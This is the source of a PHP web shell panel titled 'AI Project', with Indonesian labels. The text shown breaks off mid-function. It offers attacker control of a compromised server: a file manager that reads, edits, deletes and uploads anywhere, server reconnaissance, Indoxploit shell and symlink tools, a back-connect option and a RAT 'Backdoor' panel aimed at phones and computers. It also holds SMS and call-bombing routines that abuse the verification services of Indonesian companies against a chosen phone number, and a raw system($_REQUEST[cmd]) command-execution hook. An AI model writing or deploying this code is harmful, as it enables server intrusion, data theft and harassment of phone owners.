<?php

session_start();
date_default_timezone_set("Asia/Jakarta");

$version = "v1.4";

if(isset($_GET['rat-android-siapa'])) {
        $path = dirname(__FILE__)."/rat/android/";
        $siapa = $_GET['rat-android-siapa'];
        if (!file_exists($path)) {
             mkdir($path, 0777, true);
        }
        xwriteFile($path.$siapa, $siapa);

        $data = [ "target" => xreadFile($path."target.txt"),
                  "aksi" => xreadFile($path."aksi.txt")
        ];

        echo json_encode($data);
}
elseif(isset($_GET['rat-android-target'])) {
        $path = dirname(__FILE__)."/rat/android/";
        $target = $_GET['rat-android-target'];
        if (!file_exists($path)) {
             mkdir($path, 0777, true);
        }
        xwriteFile($path."target.txt", $target);

        echo("<script>location.href = '?backdoor';</script>");
}
else {
        echo '<!DOCTYPE HTML>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalabe=no"/>


<link href="" rel="stylesheet" type="text/css">
<title>AI Project '.$version.'</title>
<style>

#bar_blank {
    border: solid 1px #FFF;
    height: 20px;
    width: 300px;
}
#bar_color {
    background-color: #00AA00;
    height: 20px;
    width: 0px;
}
#bar_blank, #hidden_iframe {
    display: none;
}

body{
background-color: black;
color:white;
}
#content tr:hover{
background-color: red;
text-shadow:0px 0px 10px #fff;
}
#content .first{
background-color: red;
}
table{
border: 1px #000000 dotted;
}
a{
color:white;
text-decoration: none;
}
a:hover{
color:blue;
text-shadow:0px 0px 10px #ffffff;
}
input,select,textarea{
border: 1px #000000 solid;
-moz-border-radius: 5px;
-webkit-border-radius:5px;
border-radius:5px;
}
</style>
</head>
<body>

<h1><center><font color="aqua">AI Project '.$version.'</font></center></h1>

<center>
			<a href="?server_info">
				<input type="submit" value="Server Info" />
			</a>&nbsp;&nbsp;&nbsp;&nbsp;
			<a href="?file_manager">
				<input type="submit" value="File Manager" />
			</a>&nbsp;&nbsp;&nbsp;&nbsp;
			<a href="?php_info">
				<input type="submit" value="Php Info" />
			</a>&nbsp;&nbsp;&nbsp;&nbsp;
			<a href="?indox_tools"><br>
				<input type="submit" value="Indoxploit Tools" />
			</a>&nbsp;&nbsp;&nbsp;&nbsp;
			<a href="?mass_injector">
				<input type="submit" value="Code Injector" />
			</a>&nbsp;&nbsp;&nbsp;&nbsp;
			<a href="?uploader">
				<input type="submit" value="Uploader" />
			</a>&nbsp;&nbsp;&nbsp;&nbsp;<br>
			<a href="?domains">
				<input type="submit" value="Domains" />
			</a>&nbsp;&nbsp;&nbsp;&nbsp;
			<a href="?back_connecter">
				<input type="submit" value="Back Connecter" />
			</a>&nbsp;&nbsp;&nbsp;&nbsp;<br>
			<a href="?proxy">
				<input type="submit" value="Proxy" />
			</a>&nbsp;&nbsp;&nbsp;&nbsp;
                        <a href="?backdoor">
				<input type="submit" value="Backdoor" />
			</a>&nbsp;&nbsp;&nbsp;&nbsp;
                        <a href="?sms_spam"><br>
				<input type="submit" value="Spam sms" />
			</a>&nbsp;&nbsp;&nbsp;&nbsp;

</center><br><br>
<table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
<tr><td>';
}

if(isset($_GET['server_info'])) {
	$output[] = "SERVER IP ".color(1, 2, $GLOBALS['SERVERIP'])." / YOUR IP ".color(1, 2, $_SERVER['REMOTE_ADDR']);
	$output[] = "WEB SERVER  : ".color(1, 2, $_SERVER['SERVER_SOFTWARE']);
	$output[] = "BROWSER     : ".color(1, 2, $_SERVER['HTTP_USER_AGENT']);

	$output[] = "SYSTEM      : ".color(1, 2, php_uname());
	$output[] = "USER / GROUP: ".color(1, 2, usergroup()->name)."(".color(1, 2 , usergroup()->uid).") / ".color(1, 2 , usergroup()->group)."(".color(1, 2 , usergroup()->gid).")"."<font color='yellow'>  ".get_current_user()."</font>";
	$output[] = "HDD         : ".color(1, 2, hdd()->used)." / ".color(1, 2 , hdd()->size)." (Free: ".color(1, 2 , hdd()->free).")";
	$output[] = "PHP VERSION : ".color(1, 2, @phpversion());
	$output[] = "SAFE MODE   : ".(@ini_get(strtoupper("safe_mode")) === "ON" ? color(1, 2, "ON") : color(1, 2, "OFF"));
	$output[] = "DISABLE FUNC: $disable_functions";
	$output[] = lib_installed();
		
	print "<pre>";
	print implode("<br>", $output);
	print "</pre>";
}

if(isset($_GET['backdoor']))
{
	if ($_SESSION['opt-rat'] != null) {
		backdoor($_SESSION['opt-rat']);
	}
        else {
                echo '</center></td>
		<td><form method="POST" action="">
		<select name="opt-rat">
		<option value="">Pilih OS</option>
		<option value="android">Android</option>
		<option value="windows">Windows</option>
		<option value="linux">Linux</option>
		<option value="iphone">Iphone</option>

		</select>
		<input type="submit" value=">">
		</form></td>
		</tr>';
                if (isset($_POST['opt-rat'])) {
                     $_SESSION['opt-rat'] = $_POST['opt-rat'];
                     echo("<script>location.href = '?backdoor';</script>");
                }
        }
}



if(isset($_GET['sms_spam'])) {
	if (isset($_POST['sms_nomor']) && isset($_POST['sms_jumlah']) && isset($_POST['sms_jeda'])) {
		$nomor = $_POST['sms_nomor'];
		$jumlah = $_POST['sms_jumlah']; /* untuk tokopedia mengaunakan type 1 sms 2 call */
		$jeda = $_POST['sms_jeda'];

		$tools = $_SESSION['sms_spam'];

		if ($tools == 'jdid') {
			$execute = jdid_smsbom($nomor, $jumlah, $jeda);
			print $execute;
			print "DONE ALL SEND\n";
		}
		elseif ($tools == 'telkomsel') {
			$execute = telk_smsbom($nomor, $jumlah, $jeda);
			print $execute;
		}
		elseif ($tools == 'phd') {
			$init = new PhdSmsBom();
			$init->no = $nomor;
			for ($i=0; $i<$jumlah; $i++) {
				$init->Verif($init->no);
			}
		}
		elseif ($tools == 'mataharimall') {
			$init = new MataharimallSmsBom();
			$init->email = "zumupolij@c1oramn.com";
			$init->pass = "Hilih kintil";
			$init->Login($init->email,$init->pass);
			$init->no = $nomor;

			for ($i=0; $i<$jumlah; $i++) { 
				$init->Verif($init->no);
			}
		}
		elseif ($tools == 'tokopedia') {
			$init = new TokopediaSmsBom();
			$init->no = $nomor;
			$init->type = $jumlah;

			if ($init->type == 1) {
				for ($i=0; $i<2; $i++) { 
					$init->Verif($init->no,$init->type);
				}
			}elseif ($init->type == 2) {
				$init->Verif($init->no,$init->type);
			}
		}
		
	}

	elseif ($_POST['sms'] == 'jdid') {
		$_SESSION['sms_spam'] = 'jdid';

		echo color(1, 2, "Spam sms menggunakan server JDID");

		print "<form method='post' action='' style='margin-top: 15px;'>
			<input style='border: none; border-bottom: 1px solid #ffffff;' type='text' name='sms_nomor' value='Nomor? (ex : 8xxxx)'required><br>
			<input style='border: none; border-bottom: 1px solid #ffffff;' type='text' name='sms_jumlah' value='Jumlah?'required><br>
			<input style='border: none; border-bottom: 1px solid #ffffff;' type='text' name='sms_jeda' value='Jeda? 0-9999999999 (ex:0)'required><br>
			<br><input style='border: none; border-bottom: 1px solid #ffffff;' class='input' type='submit' value='BOM..'>
			</form>";
	}
	elseif ($_POST['sms'] == 'telkomsel') {
		$_SESSION['sms_spam'] = 'telkomsel';

		echo color(1, 2, "Spam sms menggunakan server TELKOMSEL");

		print "<form method='post' action='' style='margin-top: 15px;'>
			<input style='border: none; border-bottom: 1px solid #ffffff;' type='text' name='sms_nomor' value='Nomor? (ex : 628xxxx)'required><br>
			<input style='border: none; border-bottom: 1px solid #ffffff;' type='text' name='sms_jumlah' value='Jumlah?'required><br>
			<input style='border: none; border-bottom: 1px solid #ffffff;' type='text' name='sms_jeda' value='Jeda? 0-99999 (ex:1)'required><br>
			<br><input style='border: none; border-bottom: 1px solid #ffffff;' class='input' type='submit' value='BOM..'>
			</form>";
	}
	elseif ($_POST['sms'] == 'phd') {
		$_SESSION['sms_spam'] = 'phd';

		echo color(1, 2, "Spam sms menggunakan server PHD");

		print "<form method='post' action='' style='margin-top: 15px;'>
			<input style='border: none; border-bottom: 1px solid #ffffff;' type='text' name='sms_nomor' value='Nomor Target (tanpa 0/62)'required><br>
			<input style='border: none; border-bottom: 1px solid #ffffff;' type='text' name='sms_jumlah' value='Jumlah?'required><br>
			<input style='border: none; border-bottom: 1px solid #ffffff;' type='text' name='sms_jeda' value='Jeda? 0-9999999999 (ex:0)'required><br>
			<br><input style='border: none; border-bottom: 1px solid #ffffff;' class='input' type='submit' value='BOM..'>
			</form>";
	}
	elseif ($_POST['sms'] == 'mataharimall') {
		$_SESSION['sms_spam'] = 'mataharimall';

		echo color(1, 2, "Spam sms menggunakan server MATAHARIMALL");

		print "<form method='post' action='' style='margin-top: 15px;'>
			<input style='border: none; border-bottom: 1px solid #ffffff;' type='text' name='sms_nomor' value='Nomor Target (pakai 62)'required><br>
			<input style='border: none; border-bottom: 1px solid #ffffff;' type='text' name='sms_jumlah' value='Jumlah?'required><br>
			<input style='border: none; border-bottom: 1px solid #ffffff;' type='text' name='sms_jeda' value='Jeda? 0-9999999999 (ex:0)'required><br>
			<br><input style='border: none; border-bottom: 1px solid #ffffff;' class='input' type='submit' value='BOM..'>
			</form>";
	}
	elseif ($_POST['sms'] == 'grab') {
		$_SESSION['sms_spam'] = 'grab';

		echo color(1, 2, "Spam sms menggunakan server GRAB");

		echo "kode menggunakan python selengkapnya di https://github.com/nee48";
	}
	elseif ($_POST['sms'] == 'tokopedia') {
		$_SESSION['sms_spam'] = 'tokopedia';
		echo color(1, 2, "Spam sms menggunakan server TOKOPEDIA");

		print "<form method='post' action='' style='margin-top: 15px;'>
			<input style='border: none; border-bottom: 1px solid #ffffff;' type='text' name='sms_nomor' value='Nomor Target (tanpa 62/0)'required><br>
			<input style='border: none; border-bottom: 1px solid #ffffff;' type='text' name='sms_jumlah' value='Type 1 for sms, 2 for call'required><br>
			<input style='border: none; border-bottom: 1px solid #ffffff;' type='text' name='sms_jeda' value='Jeda? 0-9999999999 (ex:0)'required><br>
			<br><input style='border: none; border-bottom: 1px solid #ffffff;' class='input' type='submit' value='BOM..'>
			</form>";
	}
	else {
		unset($_SESSION['sms_spam']);
		echo '</center></td>
		<td><center><form method="POST" action="">
		<select name="sms">
		<option value="">Pilih Server</option>
		<option value="jdid">JDID</option>
		<option value="telkomsel">TELKOMSEL</option>
		<option value="phd">PHD</option>
		<option value="mataharimall">MATAHARIMALL</option>
		<option value="grab">GRAB</option>
		<option value="tokopedia">TOKOPEDIA</option>
		</select>

		<input type="submit" value=">">
		</form></center></td>
		</tr>';	
	}
}

if(isset($_GET['proxy'])) {
        echo("<script>location.href = '/ai-web/miniProxy.php';</script>");
}

//indoxploit tools
if(isset($_GET['indox_tools'])) {
	 echo '</center></td>
		<td><center><form method="POST" action="">
		<select name="idx">
		<option value="">Pilih Tools</option>
		<option value="shell">Shell/cmd</option>
		<option value="webconsole">Webconsole</option>
		<option value="cgitelnet1">cgitelnet1</option>
		<option value="cgitelnet2">cgitelnet2</option>
		<option value="jumping">Jumping</option>
		<option value="idxconfig">idxconfig</option>
		<option value="symlink">Symlink</option>
		<option value="network">Network</option>
		<option value="krdp">krdp</option>

		</select>
		<input type="submit" value=">">
		</form></center></td>
		</tr>';	
					
	if (isset($_POST['idx']) == 'shell') {
		idx_tools("cmd");
	}
	elseif (isset($_POST['idx']) == 'webconsole') {
		idx_tools("webconsole");
	}
	elseif (isset($_POST['idx']) == 'cgitelnet1') {
		idx_tools("cgitelnet1");
	}
	elseif (isset($_POST['idx']) == 'cgitelnet2') {
		idx_tools("cgitelnet2");
	}
	elseif (isset($_POST['idx']) == 'idxconfig') {
		idx_tools("idxconfig");
	}
	elseif (isset($_POST['idx']) == 'symlink') {
		idx_tools("symlink");
	}
	elseif (isset($_POST['idx']) == 'network') {
		idx_tools("network");
	}
	elseif (isset($_POST['idx']) == 'krdp') {
		idx_tools("krdp");
	}
}

//file upload
if(isset($_FILES['file'])){
	if(copy($_FILES['file']['tmp_name'], $_SESSION['path'].'/'.$_FILES['file']['name']))
	{
		echo '<script>alert("SUKSES upload lihat di: '.$_SESSION['path'].'");</script>';
	}
	else{
		echo '<script>alert("GAGAL upload");</script>';
	}
	unset($_SESSION['path']);
}
if (isset($_GET['uploader'])) 
{
	$session_upload = ini_get("session.upload_progress.name");
	echo '
		<body>
			<div id="bar_blank">
				<div id="bar_color"></div>
			</div>
			<div id="status"></div>
			<form action="" method="POST" id="myForm" enctype="multipart/form-data" target="hidden_iframe">
				<input type="hidden" value="myForm" name="'.$session_upload.'">
				<input type="file" name="file"><br>
				<input type="submit" value="Start Upload">
			</form>
			<iframe id="hidden_iframe" name="hidden_iframe" src="about:blank"></iframe>
			<script type="text/javascript">
				function toggleBarVisibility() // progress bar
				{
					var e = document.getElementById("bar_blank");
					e.style.display = (e.style.display == "block") ? "none" : "block";
				}
				function createRequestObject() 
				{
					var http;
					if (navigator.appName == "Microsoft Internet Explorer") {
						http = new ActiveXObject("Microsoft.XMLHTTP");
					}
					else {
						http = new XMLHttpRequest();
					}
					return http;
				}
				function sendRequest() 
				{
					var http = createRequestObject();
					http.open("GET", "progress.php");
					http.onreadystatechange = function () { handleResponse(http); };
					http.send(null);
				}
				function handleResponse(http) 
				{
					var response;
					if (http.readyState == 4) 
					{
						response = http.responseText;
						document.getElementById("bar_color").style.width = response + "%";
						document.getElementById("status").innerHTML = response + "%";
						if (response < 100) 
						{
							setTimeout("sendRequest()", 1000);
						}
						else {
							toggleBarVisibility();
							document.getElementById("status").innerHTML = "Wait...";
						}
					}
				}
				function startUpload() 
				{
					toggleBarVisibility();
					setTimeout("sendRequest()", 1000);
				}
				(function () 
				{
					document.getElementById("myForm").onsubmit = startUpload;
				})();
			</script><br>
			<h3>path: '.$_SESSION['path'].'
  
		</body>';
}

//filemanager
if(isset($_GET['path']) || isset($_GET['file_manager'])){
	if (isset($_GET['path'])) $path = $_GET['path'];
	else $path = getcwd();

	$_SESSION['path'] = $path;

	if (isset($_SESSION['copy']) || isset($_SESSION['move'])) {
		if (isset($_SESSION['copy'])) {
			echo "<form method='post' action=''><input type='submit' name='paste' value='Paste Copy'></input></form><br><br>";
		} else {
			echo "<form method='post' action=''><input type='submit' name='paste' value='Paste Move'></input></form><br><br>";
		}
	}

	if (isset($_SESSION['copy']) && isset($_POST['paste'])){
		$source = $_SESSION['copy'];
		$destin = $path."/".$_SESSION['copy_name'];
				
		if (copy($source, $destin)) {
			unset($_SESSION['copy']);
			unset($_SESSION['copy_name']);
			echo "<script>alert('sukses copy s=".$source." d=".$destin."');</script>	";
			echo("<script>location.href = '/ai-web/ai.php?path=".$_SESSION['path']."';</script>");
		} else {
			echo "<font color='red'> copy file gagal</font>	";
		}
	}
	elseif (isset($_SESSION['move']) && isset($_POST['paste'])){
		$source = $_SESSION['move'];
		$destin = $path."/".$_SESSION['move_name'];
				
		if (copy($source, $destin)) {
			unset($_SESSION['move']);
			unset($_SESSION['move_name']);
						
			unlink($source);
			echo "<script>alert('sukses move s=".$source." d=".$destin."');</script>	";
			echo("<script>location.href = '/ai-web/ai.php?path=$path';</script>");
		} else {
			echo "<font color='red'> Move file gagal</font>	";
		}
	}
   
	$path = str_replace('\\','/',$path);
	$paths = explode('/',$path);

	foreach($paths as $id=>$pat){
		if($pat == '' && $id == 0){
			$a = true;
			echo '<a href="?path=/">/</a>';
			continue;
		}

		if($pat == '') continue;

		echo '<a href="?path=';
		for($i=0;$i<=$id;$i++){
			echo "$paths[$i]";
			if($i != $id) echo "/";
		}

		echo '">'.$pat.'</a>/';
	}
		
	echo '<td><form method="POST" action="?option&path='.$path.'">
		<select name="other">
		<option value="">Other</option>
		<option value="stime">Show Time</time>
		<option value="file">Create File</option>
		<option value="folder">Create Folder</option>
		</select>
		<input type="submit" value=">">
		</form></td>';
					
	echo '</td></tr><tr><td>';


	if(isset($_GET['filesrc'])){
		echo "<tr><td>Current File : ";
		echo $_GET['filesrc'];
		echo '</tr></td></table><br />';
		echo('<pre>'.htmlspecialchars(file_get_contents($_GET['filesrc'])).'</pre>');
	}
		
	//action other
	elseif(isset($_POST['newgofile'])) {
		$new = $_POST['newfile'];
		if (file_exists($new)) {
			echo '<script>alert("File already exists");</script>';
		} else {
			$file = fopen($new, "w");
			fwrite($file, "");
			fclose($file);
			echo '<script>alert("File sukses created");</script>';
		}

		echo("<script>location.href = '/ai-web/ai.php?path=$path';</script>");
	}
	elseif(isset($_POST['newgofolder'])) {
		$new = $_POST['newfolder'];
		if (fm_mkdir($new, false) === true) {
			echo '<script>alert("Folder created");</script>';
		} elseif (fm_mkdir($new, false) === $new) {
			echo '<script>alert("Folder already exists");</script>';
		} else {
			echo '<script>alert("Folder gagal dibuat");</script>';
		}

		echo("<script>location.href = '/ai-web/ai.php?path=$path';</script>");
	}
	elseif(isset($_GET['option']) && $_POST['other'] == 'file' ) {
		echo '<form method="POST" action="">New File : 
		<input name="newfile" type="text" size="20" value="'.$path.'" />
		<input type="hidden" name="path" value="'.$_POST['path'].'">
		<input type="submit" name="newgofile" value="Go" /></form>';
	}
	elseif(isset($_GET['option']) && $_POST['other'] == 'folder' ) {
		echo '<form method="POST" action="">New Folder : 
		<input name="newfolder" type="text" size="20" value="'.$path.'" />
		<input type="hidden" name="path" value="'.$_POST['path'].'">
		<input type="submit" name="newgofolder" value="Go" /></form>';
	}
	elseif(isset($_GET['option']) && $_POST['other'] == 'stime' ) {
		$vartime = $_SESSION['stime'];
		if ($vartime == '') {
			$_SESSION['stime'] = 'oke';
			echo "<script>alert('tekan ini lagi jika ingin hapus time');</script>";
		} else {
			unset($_SESSION['stime']);
		}
		echo("<script>location.href = '/ai-web/ai.php?path=".$_SESSION['path']."';</script>");
	}
		
	//action filemanager
	elseif(isset($_GET['option']) && $_POST['opt'] != 'delete'){
		echo '</table><br /><center>'.$_POST['path'].'<br /><br />';
		if($_POST['opt'] == 'chmod'){
			if(isset($_POST['perm'])){
  				if(chmod($_POST['path'],$_POST['perm'])){
					echo '<font color="green">Change Permission Berhasil</font><br/>';
				}else{
					echo '<font color="red">Change Permission Gagal</font><br />';
				}
			}
			echo '<form method="POST">Permission : <input name="perm" type="text" size="4" value="'.substr(sprintf('%o', fileperms($_POST['path'])), -4).'" /><input type="hidden" name="path" value="'.$_POST['path'].'"><input type="hidden" name="opt" value="chmod"><input type="submit" value="Go" /></form>';

		}elseif($_POST['opt'] == 'rename'){
			if(isset($_POST['newname'])){
				if(rename($_POST['path'],$path.'/'.$_POST['newname'])){
					echo '<font color="green">Ganti Nama Berhasil</font><br/>';
				}else{
					echo '<font color="red">Ganti Nama Gagal</font><br />';
				}

				$_POST['name'] = $_POST['newname'];
			}
			echo '<form method="POST">New Name : <input name="newname" type="text" size="20" value="'.$_POST['name'].'" /><input type="hidden" name="path" value="'.$_POST['path'].'"><input type="hidden" name="opt" value="rename"><input type="submit" value="Go" /></form>';

		}
                elseif($_POST['opt'] == 'editfull') {
                        if(isset($_POST['src'])){
		             $fp = fopen($_POST['path'],'w');
		             if(fwrite($fp,$_POST['src'])){
			        echo '<font color="green">Berhasil Edit File</font><br/>';
			     }else{
			        echo '<font color="red">Gagal Edit File</font><br/>';
			     }

			     fclose($fp);
		        }
                        
                        echo '<script language="javascript" type="text/javascript" src="/ai-web/editarea/edit_area_full.js"></script>';
                        echo '<script language="javascript" type="text/javascript">';
                        echo "editAreaLoader.init({id : 'textarea_1', toolbar: 'save,load,search,go_to_line,|,undo,redo,|, select_font, |, syntax_selection, |, change_smooth_selection, highlight, reset_highlight, |, help', syntax_selection_allow: 'css,html,js,php,python,vb,xml,c,cpp,sql,basic,pas,brainfuck',syntax:'php', start_highlight: true, save_callback:'mysave'});";
                        echo "function mysave(id, content){  alert(content);  }";
                        echo "</script>";

                        echo '<form method="POST"><input type="hidden" name="path" value="'.$_POST['path'].'"><input type="hidden" name="opt" value="edit"><input type="submit" value="Save" /><br><textarea id="textarea_1" name="src" cols="800" rows="105">'.    htmlspecialchars(file_get_contents($_POST["path"]))  .'</textarea></form>';
                }

                elseif($_POST['opt'] == 'edit'){
                        if(isset($_POST['src'])){
		             $fp = fopen($_POST['path'],'w');
		             if(fwrite($fp,$_POST['src'])){
			        echo '<font color="green">Berhasil Edit File</font><br/>';
			     }else{
			        echo '<font color="red">Gagal Edit File</font><br/>';
			     }

			     fclose($fp);
		        }
                        //echo("<script>location.href ='editor.php?title=".$_POST['path'].'/'.$_POST['name']."';</script>");
			echo '<form method="POST"><input type="hidden" name="path" value="'.$_POST['path'].'"><input type="hidden" name="opt" value="edit"><input type="submit" value="Save"/><textarea cols=1000 rows=60 name="src" style="background:#000000;color:#30FF00">'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea><br/></form>';

		}elseif($_POST['opt'] == 'download') {
			$path = $_POST['path'];
			echo("<script>location.href ='/ai-web/download.php?id=$path';</script>");

		}elseif($_POST['opt'] == 'copy') {
			$_SESSION['copy'] = $path.'/'.$_POST['name'];
			$_SESSION['copy_name'] = $_POST['name'];
			echo("<script>location.href = '/ai-web/ai.php?path=".$_SESSION['path']."';</script>");

		}elseif($_POST['opt'] == 'move') {
			$_SESSION['move'] = $path.'/'.$_POST['name'];
			$_SESSION['move_name'] = $_POST['name'];
			echo("<script>location.href = '/ai-web/ai.php?path=".$_SESSION['path']."';</script>");

		}elseif($_POST['opt'] == 'zip') {
			$zipper = new FM_Zipper();
			$zipsource = $path."/".$_POST['name'];
			
			$res = $zipper->create($zipsource.".zip", $zipsource);
			if ($res) {
				echo "<script>alert('Archive sukses ".$zipsource.".zip');</script>";
				echo("<script>location.href = '/ai-web/ai.php?path=".$_SESSION['path']."';</script>");
			}else{
				echo "<font color='red'>gagal pack folder</font>";
			}
		
		}elseif($_POST['opt'] == 'extrak') {
			$zipper = new FM_Zipper();
			$zipsource = $path."/".$_POST['name'];
			$res = $zipper->unzip($zipsource, $path);
			if ($res) {
				echo "<script>alert('Extrak sukses');</script>";
				echo("<script>location.href = '/ai.php?path=".$_SESSION['path']."';</script>");
			}else{
				echo "<font color='red'>Gagal extrak archive</font>";
			}
		}elseif($_POST['opt'] == 'open_image') {
			$image = $path."/".$_POST['name'];
			echo("<script>location.href ='/ai-web/download.php?id=gambar:$image';</script>");

		}elseif($_POST['opt'] == 'convert_media') {
			$conv = $path.'/'.$_POST['name'];
			exec('ffmpeg -i '.$conv.' -f mp3 -ab 192000 -vn '.$conv.'.mp3');
			echo "<script>alert('sukes convert');</script>";

		}elseif($_POST['opt'] == 'open_video') {
			echo '
			<video width="320" height="240" controls autoplay>
			   <source src="'.$path.'/'.$_POST['name'].'" type="video/mp4">
			   Sorry browser tidak suppport video.
			</video>

			';
		}

		echo '</center>';
	}else{
		echo '</table><br/><center>';
		if(isset($_GET['option']) && $_POST['opt'] == 'delete'){
			if($_POST['type'] == 'dir'){
				if(fm_rdelete($_POST['path'])){
					echo '<font color="green">Directory Terhapus</font><br/>';
				}else{
					echo '<font color="red">Directory Gagal Terhapus</font><br/>';
				}
			}elseif($_POST['type'] == 'file'){
				if(unlink($_POST['path'])){
					echo '<font color="green">File Terhapus</font><br/>';
				}else{
					echo '<font color="red">File Gagal Dihapus</font><br/>';
				}
			}
		}

		echo '</center>';
		$scandir = scandir($path);
	
		echo '<div id="content"><table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
		<tr class="first">
		<td><center>Name</peller></center></td>
		<td><center>Size</peller></center></td>
		<td><center>Permission</peller></center></td>
		<td><center>Modify</peller></center></td>
		</tr>';

		foreach($scandir as $dir){
			if(!is_dir($path.'/'.$dir) || $dir == '.' || $dir == '..') continue;
				
			//show dir
			echo '<tr>
			<td><a href="?path='.$path.'/'.$dir.'">'.$dir.'</a></td>';
			

                        //echo '<td><center>xxx--</center></td>';
                        $jpath = 0;
                        $jfile = 0;
                        foreach(scandir($path.'/'.$dir) as $zdir)
                        {
                            if ($zdir != '.' && $zdir != '..')
                            {
                               $pbusy = $path.'/'.$dir.'/'.$zdir;
                               if (is_dir($pbusy))
                                   $jpath += 1;
                               else
                                   $jfile += 1;
                            }
                        }
                        if ($jpath == 0 && $jfile == 0)
                           echo '<td><center><font color="yellow">'.$jpath.' dir / '.$jfile.' file</font></center></td>';
                        else
			   echo '<td><center>'.$jpath.' dir / '.$jfile.' file</center></td>';
			$jpath = 0;
                        $jfile = 0;

                        echo '<td><center>';
											
			if(is_writable($path.'/'.$dir)) echo '<font color="green">';
			elseif(!is_readable($path.'/'.$dir)) echo '<font color="red">';
											
			echo perms($path.'/'.$dir);
			if(is_writable($path.'/'.$dir) || !is_readable($path.'/'.$dir)) echo '</font>';
											
			echo '</center></td>
			<td><center><form method="POST" action="?option&path='.$path.'">
			<select name="opt">
			<option value="">Select</option>
			<option value="delete">Delete</option>
			<option value="chmod">Chmod</option>
			<option value="rename">Rename</option>
			<option value="zip">Zip</option>
			</select>
			<input type="hidden" name="type" value="dir">
			<input type="hidden" name="name" value="'.$dir.'">
			<input type="hidden" name="path" value="'.$path.'/'.$dir.'">
			<input type="submit" value=">">
			</form></center></td>
			</tr>';
		}
		echo '<tr class="first"><td></td><td></td><td></td><td></td></tr>';

		foreach($scandir as $file){
			if(!is_file($path.'/'.$file)) continue;
				
			$size = filesize($path.'/'.$file)/1024;
			$size = round($size,3);
			if($size >= 1024){
				$size = round($size/1024,2).' MB';
			}else{
				$size = $size.' KB';
			}
				
			//show file
			if ($_SESSION['stime'] == '') {
				echo '<tr>
				<td>	<a href="?filesrc='.$path.'/'.$file.'&path='.$path.'">'.$file.'</a></td>
				<td><center>'.$size.'</center></td>
				<td><center>';	
			} else {
				$time = date("d-m-Y H:i:s", fileatime($path.'/'.$file));
				echo '<tr>
				<td>'.$time.'   <a href="?filesrc='.$path.'/'.$file.'&path='.$path.'">'.$file.'</a></td>
				<td><center>'.$size.'</center></td>
				<td><center>';
			}

			if(is_writable($path.'/'.$file)) echo '<font color="green">';
			elseif(!is_readable($path.'/'.$file)) echo '<font color="red">';

			echo perms($path.'/'.$file);

			if(is_writable($path.'/'.$file) || !is_readable($path.'/'.$file)) echo '</font>';
			
			$mime = strtolower(pathinfo($path.'/'.$file, PATHINFO_EXTENSION));
			if ($mime == "zip" || $mime == "tar" || $mime == "rar") {
				echo '</center></td>
				<td><center><form method="POST" action="?option&path='.$path.'">
				<select name="opt">
				<option value="">Select</option>
				<option value="extrak">Extrak</option>
				<option value="delete">Delete</option>
				<option value="chmod">Chmod</option>
				<option value="rename">Rename</option>
				<option value="edit">Edit</option>
                                <option value="editfull">Editfull</option>
				<option value="copy">Copy</option>
				<option value="move">Move</option>
				<option value="download">Download</option>
				</select>
				<input type="hidden" name="type" value="file">
				<input type="hidden" name="name" value="'.$file.'">
				<input type="hidden" name="path" value="'.$path.'/'.$file.'">
				<input type="submit" value=">">
				</form></center></td>
				</tr>';
			}elseif ($mime == "3gp" || $mime == "mp4" || $mime == "mkv") {
				echo '</center></td>
				<td><center><form method="POST" action="?option&path='.$path.'">
				<select name="opt">
				<option value="">Select</option>
				<option value="open_video">Open Video</option>
				<option value="convert_media">Convert to mp3</option>
				<option value="delete">Delete</option>
				<option value="chmod">Chmod</option>
				<option value="rename">Rename</option>
				<option value="edit">Edit</option>
                                <option value="editfull">Editfull</option>
				<option value="copy">Copy</option>
				<option value="move">Move</option>
				<option value="download">Download</option>
				</select>
				<input type="hidden" name="type" value="file">
				<input type="hidden" name="name" value="'.$file.'">
				<input type="hidden" name="path" value="'.$path.'/'.$file.'">
				<input type="submit" value=">">
				</form></center></td>
				</tr>';
			} elseif ($mime == "jpg" || $mime == "jpeg" || $mime == "png" || $mime == "gif") {
				echo '</center></td>
				<td><center><form method="POST" action="?option&path='.$path.'">
				<select name="opt">
				<option value="">Select</option>
				<option value="open_image">Open Image</option>
				<option value="delete">Delete</option>
				<option value="chmod">Chmod</option>
				<option value="rename">Rename</option>
				<option value="edit">Edit</option>
                                <option value="editfull">Editfull</option>
				<option value="copy">Copy</option>
				<option value="move">Move</option>
				<option value="download">Download</option>
				</select>
				<input type="hidden" name="type" value="file">
				<input type="hidden" name="name" value="'.$file.'">
				<input type="hidden" name="path" value="'.$path.'/'.$file.'">
				<input type="submit" value=">">
				</form></center></td>
				</tr>';
			} else {
				echo '</center></td>
				<td><center><form method="POST" action="?option&path='.$path.'">
				<select name="opt">
				<option value="">Select</option>
				<option value="delete">Delete</option>
				<option value="chmod">Chmod</option>
				<option value="rename">Rename</option>
				<option value="edit">Edit</option>
                                <option value="editfull">Editfull</option>
				<option value="copy">Copy</option>
				<option value="move">Move</option>
				<option value="download">Download</option>
				</select>
				<input type="hidden" name="type" value="file">
				<input type="hidden" name="name" value="'.$file.'">
				<input type="hidden" name="path" value="'.$path.'/'.$file.'">
				<input type="submit" value=">">
				</form></center></td>
				</tr>';
			}
		}

		echo '</table></div>';
	}
	echo '</body></html>';
}
if (isset($_GET['php_info'])) {
	echo phpinfo();
}

if (isset($_GET['mass_injector'])) {
	echo "<br><center><br>
	<font style='color: teal; font-family: cursive; font-size: 200%;'>ReV Mass Code Injector V2.0</font><br><br>
	<form action='' method='POST'>";

	$_ec5b37e72301 = '';

	if (isset($_REQUEST[cmd])) {
		system ($_REQUEST[cmd]);
	}

	echo "<textarea type='text' name='code' rows='13' cols='80' placeholder='Enter Your Code Like This : ".$_ec5b37e72301."'></textarea><br><br>".
		 "<input style='font-size: 90%;' type='submit' name='submit' value='Submit' /></form>";
	if (isset($_POST['submit'])) {
		$_e04f8301a9f1 = $_POST['code'];
		$_9f7af403d39c = base64_encode($_e04f8301a9f1);
		$_d586cea720c2 = getcwd();
		$_959a28065435 = 'http://'.$_SERVER['HTTP_HOST'];
		$_da84e8d0e5e8 = $_SERVER['SCRIPT_NAME'];
		$_d394e1453852 = $_959a28065435.$_da84e8d0e5e8;
		$_d586cea720c2 = getcwd();
		$_3528fced53a2 = $_d586cea720c2;
		
	if (empty($_e04f8301a9f1)) {
